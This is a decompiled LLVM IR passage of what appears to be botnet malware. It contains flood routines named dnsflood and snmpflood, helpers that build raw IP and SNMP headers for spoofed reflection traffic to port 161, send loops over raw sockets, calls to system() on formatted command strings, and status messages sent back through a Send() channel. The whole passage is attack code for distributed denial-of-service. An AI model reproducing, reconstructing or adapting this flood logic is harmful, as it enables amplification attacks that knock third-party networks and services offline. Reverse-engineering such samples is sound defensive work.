dec_label_pc_10002fc0:                            ; preds = %dec_label_pc_10002f9c
  %v0_10002fc4 = call i32 @__GI_exit()
  br label %dec_label_pc_10002fc8

dec_label_pc_10002fc8:                            ; preds = %dec_label_pc_10002f9c, %dec_label_pc_10002fc0
  %v2_10002fcc = icmp sgt i32 %arg3, 4
  br i1 %v2_10002fcc, label %dec_label_pc_10002ffc, label %dec_label_pc_10002fd4

dec_label_pc_10002fd4:                            ; preds = %dec_label_pc_10002fc8
  %v3_10002fd8 = load i32, i32* @global_var_1004517c.23, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10002ff0 = call i32 @Send(i32 %v3_10002fd8, i32 ptrtoint ([67 x i8]* @global_var_1002a5e8.106 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10002ff8 = call i32 @__GI_exit()
  br label %dec_label_pc_10002ffc

dec_label_pc_10002ffc:                            ; preds = %dec_label_pc_10002fc8, %dec_label_pc_10002fd4
  %v1_10003000 = add i32 %arg4, 12
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v1_10003004 = inttoptr i32 %v1_10003000 to i32*
  %v2_10003004 = load i32, i32* %v1_10003004, align 4
  store i32 %v2_10003004, i32* @r3, align 4
  %v0_1000300c = call i32 @__GI_strlen()
  %v1_10003014 = mul i32 %v0_1000300c, 5
  store i32 %v1_10003014, i32* %r9.global-to-local, align 4
  %v1_10003018 = add i32 %v1_10003014, 160
  %v2_10003024 = icmp sgt i32 %v1_10003018, 1023
  br i1 %v2_10003024, label %dec_label_pc_100033bc, label %dec_label_pc_1000302c

dec_label_pc_1000302c:                            ; preds = %dec_label_pc_10002ffc
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003038 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003044 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_10003050 = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_1000305c = load i32, i32* %v1_10003004, align 4
  store i32 %v1_10003000, i32* %r9.global-to-local, align 4
  %v2_1000306c = ptrtoint i32* %stack_var_-1376 to i32
  store i32 %v2_1000306c, i32* @r3, align 4
  store i32 %v1_10003018, i32* @r4, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_1002a62c.107 to i32), i32* @r5, align 4
  store i32 %v2_1000305c, i32* %r9.global-to-local, align 4
  store i32 268447896, i32* @lr, align 4
  %v9_10003094 = call i32 @__GI_snprintf(i32 %v2_1000306c, i32 %v1_10003018, i32 ptrtoint ([171 x i8]* @global_var_1002a62c.107 to i32), i32 %v2_10003038, i32 %v2_10003044, i32 %v2_10003050, i32 %v2_1000305c, i32 %v1_10003018)
  store i32 268447908, i32* @lr, align 4
  %v1_100030a0 = call i32 @system(i32 %v2_1000306c)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 256, i32* @r3, align 4
  store i32 268447928, i32* @lr, align 4
  %v0_100030b4 = call i32 @malloc()
  store i32 256, i32* %r9.global-to-local, align 4
  store i32 %v0_100030b4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 256, i32* @r5, align 4
  store i32 268447960, i32* @lr, align 4
  %v0_100030d4 = call i32 @__GI_memset()
  %v2_10003148 = ptrtoint i32* %stack_var_-319 to i32
  store i32 255, i32* %r9.global-to-local, align 4
  store i32 %v2_10003148, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 255, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003160.108 to i32), i32* @lr, align 4
  %v0_1000315c = call i32 @__GI_memset()
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268448124, i32* @lr, align 4
  %v3_10003178 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002a6d8.109 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32))
  br label %dec_label_pc_100031a0

dec_label_pc_10003188:                            ; preds = %dec_label_pc_100031a0
  %v2_10003190 = call i32 @ParseResolverLine(i32 %v0_100030d4, i32 %stack_var_-1396.0)
  store i32 %stack_var_-1396.0, i32* %r9.global-to-local, align 4
  %v1_10003198 = add i32 %stack_var_-1396.0, 1
  br label %dec_label_pc_100031a0

dec_label_pc_100031a0:                            ; preds = %dec_label_pc_1000302c, %dec_label_pc_10003188
  %stack_var_-1396.0 = phi i32 [ 0, %dec_label_pc_1000302c ], [ %v1_10003198, %dec_label_pc_10003188 ]
  store i32 268448176, i32* @lr, align 4
  %v3_100031ac = call i32 @fgets(i32 %v0_100030d4, i32 256, i32 %v3_10003178)
  %v3_100031b4 = icmp eq i32 %v3_100031ac, 0
  br i1 %v3_100031b4, label %dec_label_pc_100031bc, label %dec_label_pc_10003188

dec_label_pc_100031bc:                            ; preds = %dec_label_pc_100031a0
  %v1_100031c8 = add i32 %arg4, 16
  store i32 %v1_100031c8, i32* %r9.global-to-local, align 4
  %v1_100031cc = inttoptr i32 %v1_100031c8 to i32*
  %v2_100031cc = load i32, i32* %v1_100031cc, align 4
  store i32 268448216, i32* @lr, align 4
  %v1_100031d4 = call i32 @atol(i32 %v2_100031cc)
  %v3_100031e4 = load i32, i32* @global_var_10045194.105, align 4
  store i32 %v3_100031e4, i32* %r9.global-to-local, align 4
  %v1_100031e8 = add i32 %v3_100031e4, 532
  %v2_100031e8 = inttoptr i32 %v1_100031e8 to i32*
  %v3_100031e8 = load i32, i32* %v2_100031e8, align 4
  store i32 0, i32* @r3, align 4
  %v1_100031fc = call i32 @htons(i32 0)
  %v1_1000320c = add i32 %arg4, 4
  store i32 %v1_1000320c, i32* %r9.global-to-local, align 4
  %v1_10003210 = inttoptr i32 %v1_1000320c to i32*
  %v2_10003210 = load i32, i32* %v1_10003210, align 4
  store i32 268448284, i32* @lr, align 4
  %v1_10003218 = call i32 @inet_addr(i32 %v2_10003210)
  %v1_10003228 = mul i32 %v1_100031d4, 28
  %v1_10003230 = add i32 %v1_10003228, 30
  %v1_10003234 = and i32 %v1_10003230, -16
  %v2_1000323c = load i32, i32* %stack_var_-1424, align 4
  %v1_10003244 = load i32, i32* @r1, align 4
  %v3_10003244 = sub i32 %v1_10003244, %v1_10003234
  %v4_10003244 = inttoptr i32 %v3_10003244 to i32*
  store i32 %v2_1000323c, i32* %v4_10003244, align 4
  %v1_10003254 = add i32 %v3_10003244, 23
  %v1_10003258 = and i32 %v1_10003254, -16
  %v1_10003270 = add i32 %arg4, 8
  store i32 %v1_10003270, i32* %r9.global-to-local, align 4
  %v1_10003274 = inttoptr i32 %v1_10003270 to i32*
  %v2_10003274 = load i32, i32* %v1_10003274, align 4
  store i32 268448384, i32* @lr, align 4
  %v1_1000327c = call i32 @atol(i32 %v2_10003274)
  store i32 %v1_100031d4, i32* %r9.global-to-local, align 4
  %v2_100033402 = icmp sgt i32 %v1_100031d4, 0
  br i1 %v2_100033402, label %dec_label_pc_10003294, label %dec_label_pc_10003348

dec_label_pc_10003294:                            ; preds = %dec_label_pc_100031bc, %dec_label_pc_10003294
  %storemerge15 = phi i32 [ %v1_10003330, %dec_label_pc_10003294 ], [ 0, %dec_label_pc_100031bc ]
  %v1_1000329c = mul i32 %storemerge15, 28
  %v2_100032a0 = add i32 %v1_1000329c, %v1_10003258
  %v2_100032a8 = inttoptr i32 %v2_100032a0 to i32*
  store i32 %storemerge15, i32* %v2_100032a8, align 4
  store i32 %v2_100032a0, i32* %r9.global-to-local, align 4
  store i32 %v1_10003218, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v2_100032cc = add i32 %v2_100032a0, 8
  %v3_100032cc = inttoptr i32 %v2_100032cc to i32*
  store i32 2, i32* %v3_100032cc, align 4
  %v0_100032d0 = load i32, i32* @r11, align 4
  %v1_100032d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d0 = add i32 %v1_100032d0, 12
  %v3_100032d0 = inttoptr i32 %v2_100032d0 to i32*
  store i32 %v0_100032d0, i32* %v3_100032d0, align 4
  %v0_100032d4 = load i32, i32* @r10, align 4
  %v1_100032d4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d4 = add i32 %v1_100032d4, 16
  %v3_100032d4 = inttoptr i32 %v2_100032d4 to i32*
  store i32 %v0_100032d4, i32* %v3_100032d4, align 4
  %v1_100032d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100032d8 = add i32 %v1_100032d8, 20
  %v3_100032d8 = inttoptr i32 %v2_100032d8 to i32*
  store i32 %tmp, i32* %v3_100032d8, align 4
  %v1_100032ec = add i32 %v2_100032a0, 4
  %v2_100032f4 = inttoptr i32 %v1_100032ec to i32*
  store i32 %v3_100031e8, i32* %v2_100032f4, align 4
  %v1_10003308 = add i32 %v2_100032a0, 24
  %v2_10003310 = inttoptr i32 %v1_10003308 to i32*
  store i32 %v1_1000327c, i32* %v2_10003310, align 4
  store i32 %v1_10003258, i32* %r9.global-to-local, align 4
  store i32 268448556, i32* @lr, align 4
  %v3_10003328 = call i32 @dnsflood(i32 %v2_100032a0, i32 %tmp, i32 %v1_10003258)
  %v1_10003330 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_100031d4, i32* %r9.global-to-local, align 4
  %v2_10003340 = icmp slt i32 %v1_10003330, %v1_100031d4
  br i1 %v2_10003340, label %dec_label_pc_10003294, label %dec_label_pc_10003348

dec_label_pc_10003348:                            ; preds = %dec_label_pc_10003294, %dec_label_pc_100031bc
  %v3_1000334c = load i32, i32* @global_var_1004517c.23, align 4
  store i32 %v1_1000320c, i32* %r9.global-to-local, align 4
  %v2_10003358 = load i32, i32* %v1_10003210, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_10003384 = call i32 @Send(i32 %v3_1000334c, i32 ptrtoint ([36 x i8]* @global_var_1002a6e4.111 to i32), i32 %arg2, i32 %v2_10003358)
  %tmp47 = icmp slt i32 %arg3, 5
  br i1 %tmp47, label %dec_label_pc_100033b4, label %dec_label_pc_10003394

dec_label_pc_10003394:                            ; preds = %dec_label_pc_10003348
  %v1_10003398 = add i32 %arg4, 20
  store i32 %v1_10003398, i32* %r9.global-to-local, align 4
  %v1_1000339c = inttoptr i32 %v1_10003398 to i32*
  %v2_1000339c = load i32, i32* %v1_1000339c, align 4
  store i32 268448680, i32* @lr, align 4
  %v1_100033a4 = call i32 @atol(i32 %v2_1000339c)
  store i32 ptrtoint ([3 x i8]* @global_var_100033b4.112 to i32), i32* @lr, align 4
  %v1_100033b0 = call i32 @sleep(i32 %v1_100033a4)
  br label %dec_label_pc_100033b4

dec_label_pc_100033b4:                            ; preds = %dec_label_pc_10003348, %dec_label_pc_10003394
  %v0_100033b8 = call i32 @__GI_exit()
  br label %dec_label_pc_100033bc

dec_label_pc_100033bc:                            ; preds = %entry, %dec_label_pc_10002ffc, %dec_label_pc_100033b4
  %v0_100033e8 = phi i32 [ %v1_10002f8c, %entry ], [ %v0_1000300c, %dec_label_pc_10002ffc ], [ %v0_100033b8, %dec_label_pc_100033b4 ]
  store i32 %v5_10002f54, i32* %r9.global-to-local, align 4
  ret i32 %v0_100033e8

; uselistorder directives
  uselistorder i32 %v1_10003330, { 1, 0 }
  uselistorder i32 %v2_100032a0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %storemerge15, { 2, 1, 0 }
  uselistorder i32 %v1_10003258, { 2, 1, 0 }
  uselistorder i32 %v1_100031d4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_100030d4, { 1, 0 }
  uselistorder i32 %v2_1000306c, { 1, 0, 2 }
  uselistorder i32 %v2_1000305c, { 1, 0 }
  uselistorder i32 %v1_10003018, { 2, 1, 0, 3 }
  uselistorder i32* %v1_10003004, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_10003000, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-1424, { 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100033bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100033b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003294, { 1, 0 }
  uselistorder label %dec_label_pc_100031a0, { 1, 0 }
  uselistorder label %dec_label_pc_10002ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10002fc8, { 1, 0 }
}

define i32 @setup_snmp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 4500, i32* @r3, align 4
  %v1_10003408 = call i32 @htons(i32 4500)
  %sext = mul i32 %v1_10003408, 65536
  %v1_1000340c = sdiv i32 %sext, 65536
  %v1_10003414 = trunc i32 %v1_1000340c to i16
  store i16 %v1_10003414, i16* %arg1, align 2
  store i32 161, i32* @r3, align 4
  %v1_1000341c = call i32 @htons(i32 161)
  %v1_10003428 = trunc i32 %v1_1000341c to i16
  %v3_10003428 = add i32 %tmp, 2
  %v4_10003428 = inttoptr i32 %v3_10003428 to i16*
  store i16 %v1_10003428, i16* %v4_10003428, align 2
  %v3_10003434 = add i32 %tmp, 6
  %v4_10003434 = inttoptr i32 %v3_10003434 to i16*
  store i16 0, i16* %v4_10003434, align 2
  %v1_1000343c = add i32 %tmp, 8
  store i32 %v1_1000343c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002a708.113 to i32), i32* @r4, align 4
  store i32 67, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003460.114 to i32), i32* @lr, align 4
  %v0_1000345c = call i32 @memcpy()
  store i32 75, i32* @r3, align 4
  %v1_10003464 = call i32 @htons(i32 75)
  %v2_10003464 = trunc i32 %v1_10003464 to i16
  %v3_10003470 = add i32 %tmp, 4
  %v4_10003470 = inttoptr i32 %v3_10003470 to i16*
  store i16 %v2_10003464, i16* %v4_10003470, align 2
  ret i32 %v1_10003464
}

define i32 @setup_ip_header(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100034b0 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100034b0, i32* %arg1, align 4
  %v1_100034c4 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100034c4, i32* %arg1, align 4
  %v3_100034d4 = add i32 %tmp, 1
  %v4_100034d4 = inttoptr i32 %v3_100034d4 to i8*
  store i8 0, i8* %v4_100034d4, align 1
  %v3_100034e0 = add i32 %tmp, 2
  %v4_100034e0 = inttoptr i32 %v3_100034e0 to i16*
  store i16 42, i16* %v4_100034e0, align 2
  store i32 64074, i32* @r3, align 4
  %v1_100034ec = call i32 @htonl(i32 64074)
  %v1_100034fc = trunc i32 %v1_100034ec to i16
  %v3_100034fc = add i32 %tmp, 4
  %v4_100034fc = inttoptr i32 %v3_100034fc to i16*
  store i16 %v1_100034fc, i16* %v4_100034fc, align 2
  %v3_10003508 = add i32 %tmp, 6
  %v4_10003508 = inttoptr i32 %v3_10003508 to i16*
  store i16 0, i16* %v4_10003508, align 2
  %v3_10003514 = add i32 %tmp, 8
  %v4_10003514 = inttoptr i32 %v3_10003514 to i8*
  store i8 -1, i8* %v4_10003514, align 1
  %v3_10003520 = add i32 %tmp, 9
  %v4_10003520 = inttoptr i32 %v3_10003520 to i8*
  store i8 17, i8* %v4_10003520, align 1
  %v3_1000352c = add i32 %tmp, 10
  %v4_1000352c = inttoptr i32 %v3_1000352c to i16*
  store i16 0, i16* %v4_1000352c, align 2
  store i32 268449084, i32* @lr, align 4
  %v2_10003538 = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_1002a74c.115 to i32))
  %v2_10003544 = add i32 %tmp, 12
  %v3_10003544 = inttoptr i32 %v2_10003544 to i32*
  store i32 %v2_10003538, i32* %v3_10003544, align 4
  ret i32 %v2_10003538
}

define i32 @snmpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_10003580 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_1000358c = add i32 %v2_10003580, 20
  %v5_10003590 = inttoptr i32 %v1_1000358c to i16*
  %v1_1000359c = add i32 %arg1, 12
  %v2_1000359c = inttoptr i32 %v1_1000359c to i32*
  %v3_1000359c = load i32, i32* %v2_1000359c, align 4
  %v1_100035bc = add i32 %arg1, 4
  %v2_100035bc = inttoptr i32 %v1_100035bc to i32*
  %v3_100035bc = load i32, i32* %v2_100035bc, align 4
  store i32 268449236, i32* @lr, align 4
  %v3_100035d0 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_100035d0, -1
  br i1 %tmp26, label %dec_label_pc_100035f0, label %dec_label_pc_100035e8

dec_label_pc_100035e8:                            ; preds = %entry
  %v0_100035ec = call i32 @__GI_exit()
  br label %dec_label_pc_100035f0

dec_label_pc_100035f0:                            ; preds = %entry, %dec_label_pc_100035e8
  store i32 268449272, i32* @lr, align 4
  %v1_100035f4 = call i32 @__GI_time(i32 0)
  %v1_10003600 = call i32 @init_rand(i32 %v1_100035f4)
  store i32 %v2_10003580, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268449308, i32* @lr, align 4
  %v0_10003618 = call i32 @__GI_memset()
  store i32 268449316, i32* @lr, align 4
  %v2_10003620 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268449324, i32* @lr, align 4
  %v2_10003628 = call i32 @setup_snmp_header(i16* %v5_10003590)
  store i32 268449328, i32* @lr, align 4
  %v0_1000362c = call i32 @random()
  %v2_1000364c = srem i32 %v0_1000362c, 65535
  %fold = add nsw i32 %v2_1000364c, 64510
  %v1_10003678 = urem i32 %fold, 65536
  store i32 %v1_10003678, i32* @r3, align 4
  %v1_10003680 = call i32 @htons(i32 %v1_10003678)
  %v1_1000368c = trunc i32 %v1_10003680 to i16
  store i16 %v1_1000368c, i16* %v5_10003590, align 4
  %v2_10003698 = add i32 %v2_10003580, 12
  %v3_10003698 = inttoptr i32 %v2_10003698 to i32*
  store i32 %v3_1000359c, i32* %v3_10003698, align 4
  %v1_100036a0 = add i32 %v3_100035bc, 4
  %v2_100036a0 = inttoptr i32 %v1_100036a0 to i32*
  %v3_100036a0 = load i32, i32* %v2_100036a0, align 4
  %v2_100036a8 = add i32 %v2_10003580, 16
  %v3_100036a8 = inttoptr i32 %v2_100036a8 to i32*
  store i32 %v3_100036a0, i32* %v3_100036a8, align 4
  %v1_100036b4 = or i32 %v2_10003580, 2
  %v2_100036b4 = inttoptr i32 %v1_100036b4 to i16*
  %v3_100036b4 = load i16, i16* %v2_100036b4, align 2
  %div = udiv i16 %v3_100036b4, 2
  %v1_100036bc = zext i16 %div to i32
  %v2_100036cc = bitcast i32* %stack_var_-4144 to i16*
  %v3_100036cc = call i32 @csum(i16* %v2_100036cc, i32 %v1_100036bc)
  %v1_100036d8 = trunc i32 %v3_100036cc to i16
  %v3_100036d8 = add i32 %v2_10003580, 10
  %v4_100036d8 = inttoptr i32 %v3_100036d8 to i16*
  store i16 %v1_100036d8, i16* %v4_100036d8, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_100036e4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268449540, i32* @lr, align 4
  %v5_10003700 = call i32 @__GI_setsockopt(i32 %v3_100035d0, i32 0, i32 3, i32 %v2_100036e4, i32 4)
  %tmp28 = icmp sgt i32 %v5_10003700, -1
  br i1 %tmp28, label %dec_label_pc_10003718, label %dec_label_pc_10003710

dec_label_pc_10003710:                            ; preds = %dec_label_pc_100035f0
  %v0_10003714 = call i32 @__GI_exit()
  br label %dec_label_pc_10003718

dec_label_pc_10003718:                            ; preds = %dec_label_pc_100035f0, %dec_label_pc_10003710
  store i32 268449568, i32* @lr, align 4
  %v1_1000371c = call i32 @__GI_time(i32 0)
  %v1_10003728 = call i32 @init_rand(i32 %v1_1000371c)
  %v3_100037a4 = add i32 %v2_10003580, 4
  %v4_100037a4 = inttoptr i32 %v3_100037a4 to i16*
  br label %dec_label_pc_10003734

dec_label_pc_10003734:                            ; preds = %dec_label_pc_10003818, %dec_label_pc_10003718
  %stack_var_-4160.0 = phi i32 [ %v3_100035bc, %dec_label_pc_10003718 ], [ %v3_10003770, %dec_label_pc_10003818 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10003718 ], [ %v1_1000381c, %dec_label_pc_10003818 ]
  %v3_10003738 = load i16, i16* %v2_100036b4, align 2
  %v4_10003738 = zext i16 %v3_10003738 to i32
  store i32 268449644, i32* @lr, align 4
  %v6_10003768 = call i32 @sendto(i32 %v3_100035d0, i32 %v2_10003580, i32 %v4_10003738, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_10003770 = add i32 %stack_var_-4160.0, 532
  %v2_10003770 = inttoptr i32 %v1_10003770 to i32*
  %v3_10003770 = load i32, i32* %v2_10003770, align 4
  %v1_1000377c = add i32 %v3_10003770, 4
  %v2_1000377c = inttoptr i32 %v1_1000377c to i32*
  %v3_1000377c = load i32, i32* %v2_1000377c, align 4
  store i32 %v3_1000377c, i32* %v3_100036a8, align 4
  %v0_10003788 = call i32 @rand_cmwc()
  store i32 %v0_10003788, i32* @r3, align 4
  %v1_10003794 = call i32 @htonl(i32 %v0_10003788)
  %v1_100037a4 = trunc i32 %v1_10003794 to i16
  store i16 %v1_100037a4, i16* %v4_100037a4, align 4
  %v3_100037b0 = load i16, i16* %v2_100036b4, align 2
  %div29 = udiv i16 %v3_100037b0, 2
  %v1_100037b8 = zext i16 %div29 to i32
  %v3_100037c8 = call i32 @csum(i16* %v2_100036cc, i32 %v1_100037b8)
  %v1_100037d4 = trunc i32 %v3_100037c8 to i16
  store i16 %v1_100037d4, i16* %v4_100036d8, align 2
  %v3_100037dc = load i32, i32* @global_var_1004518c.119, align 4
  %v1_100037e0 = add i32 %v3_100037dc, 1
  store i32 %v1_100037e0, i32* @global_var_1004518c.119, align 4
  %v3_100037f0 = load i32, i32* @global_var_10045174.120, align 4
  %v3_100037f8 = icmp ugt i32 %v3_100037f0, %storemerge4
  br i1 %v3_100037f8, label %dec_label_pc_10003818, label %dec_label_pc_10003800

dec_label_pc_10003800:                            ; preds = %dec_label_pc_10003734
  %v3_1000380c = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268449816, i32* @lr, align 4
  %v1_10003814 = call i32 @usleep(i32 %v3_1000380c)
  br label %dec_label_pc_10003818

dec_label_pc_10003818:                            ; preds = %dec_label_pc_10003734, %dec_label_pc_10003800
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_10003734 ], [ 0, %dec_label_pc_10003800 ]
  %v1_1000381c = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10003734

; uselistorder directives
  uselistorder i32 %v3_10003770, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_10003678, { 1, 0 }
  uselistorder i32 %v2_10003580, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10003818, { 1, 0 }
  uselistorder label %dec_label_pc_10003718, { 1, 0 }
  uselistorder label %dec_label_pc_100035f0, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1080 = alloca i32, align 4
  %stack_var_-1136 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10003828 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10003828, i32* %stack_var_-1136, align 4
  %v5_10003828 = ptrtoint i32* %stack_var_-1136 to i32
  %v1_10003860 = call i32 @mfork(i32 %arg2)
  %v3_10003868 = icmp eq i32 %v1_10003860, 0
  br i1 %v3_10003868, label %dec_label_pc_10003870, label %dec_label_pc_10003e58

dec_label_pc_10003870:                            ; preds = %entry
  store i32 268449920, i32* @lr, align 4
  %v3_1000387c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp37 = icmp sgt i32 %v3_1000387c, -1
  br i1 %tmp37, label %dec_label_pc_1000389c, label %dec_label_pc_10003894

dec_label_pc_10003894:                            ; preds = %dec_label_pc_10003870
  %v0_10003898 = call i32 @__GI_exit()
  br label %dec_label_pc_1000389c

dec_label_pc_1000389c:                            ; preds = %dec_label_pc_10003870, %dec_label_pc_10003894
  %v2_100038a0 = icmp sgt i32 %arg3, 5
  br i1 %v2_100038a0, label %dec_label_pc_100038c8, label %dec_label_pc_100038a8

dec_label_pc_100038a8:                            ; preds = %dec_label_pc_1000389c
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_100038bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_1002a75c.122 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_100038c4 = call i32 @__GI_exit()
  br label %dec_label_pc_100038c8

dec_label_pc_100038c8:                            ; preds = %dec_label_pc_1000389c, %dec_label_pc_100038a8
  %v1_100038cc = add i32 %arg4, 12
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v1_100038d0 = inttoptr i32 %v1_100038cc to i32*
  %v2_100038d0 = load i32, i32* %v1_100038d0, align 4
  store i32 %v2_100038d0, i32* @r3, align 4
  %v0_100038d8 = call i32 @__GI_strlen()
  %v1_100038e0 = mul i32 %v0_100038d8, 5
  store i32 %v1_100038e0, i32* %r9.global-to-local, align 4
  %v1_100038e4 = add i32 %v1_100038e0, 165
  %v2_100038f0 = icmp sgt i32 %v1_100038e4, 1023
  br i1 %v2_100038f0, label %dec_label_pc_10003e58, label %dec_label_pc_100038f8

dec_label_pc_100038f8:                            ; preds = %dec_label_pc_100038c8
  store i32 %v1_100038e4, i32* %r10.global-to-local, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003904 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003910 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_1000391c = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003928 = load i32, i32* %v1_100038d0, align 4
  store i32 %v1_100038cc, i32* %r9.global-to-local, align 4
  %v2_10003934 = load i32, i32* %v1_100038d0, align 4
  store i32 %v2_10003934, i32* %r11.global-to-local, align 4
  %v2_10003938 = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_10003938, i32* @r3, align 4
  store i32 %v1_100038e4, i32* @r4, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_1002a7c0.123 to i32), i32* @r5, align 4
  store i32 %v2_10003928, i32* %r9.global-to-local, align 4
  store i32 %v2_10003934, i32* %r10.global-to-local, align 4
  store i32 268450148, i32* @lr, align 4
  %v9_10003960 = call i32 @__GI_snprintf(i32 %v2_10003938, i32 %v1_100038e4, i32 ptrtoint ([176 x i8]* @global_var_1002a7c0.123 to i32), i32 %v2_10003904, i32 %v2_10003910, i32 %v2_1000391c, i32 %v2_10003928, i32 %v1_100038e4)
  store i32 ptrtoint ([3 x i8]* @global_var_10003970.124 to i32), i32* @lr, align 4
  %v1_1000396c = call i32 @system(i32 %v2_10003938)
  store i32 268450168, i32* @lr, align 4
  %v1_10003974 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10003984.125 to i32), i32* @lr, align 4
  %v1_10003980 = call i32 @srand(i32 %v1_10003974)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 128, i32* @r3, align 4
  store i32 268450220, i32* @lr, align 4
  %v0_100039a8 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_100039a8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268450252, i32* @lr, align 4
  %v0_100039c8 = call i32 @__GI_memset()
  %v1_100039d8 = add i32 %arg4, 16
  store i32 %v1_100039d8, i32* %r9.global-to-local, align 4
  %v1_100039dc = inttoptr i32 %v1_100039d8 to i32*
  %v2_100039dc = load i32, i32* %v1_100039dc, align 4
  store i32 268450280, i32* @lr, align 4
  %v1_100039e4 = call i32 @atol(i32 %v2_100039dc)
  %v1_100039f4 = add i32 %arg4, 20
  store i32 %v1_100039f4, i32* %r9.global-to-local, align 4
  %v1_100039f8 = inttoptr i32 %v1_100039f4 to i32*
  %v2_100039f8 = load i32, i32* %v1_100039f8, align 4
  store i32 268450308, i32* @lr, align 4
  %v1_10003a00 = call i32 @atol(i32 %v2_100039f8)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
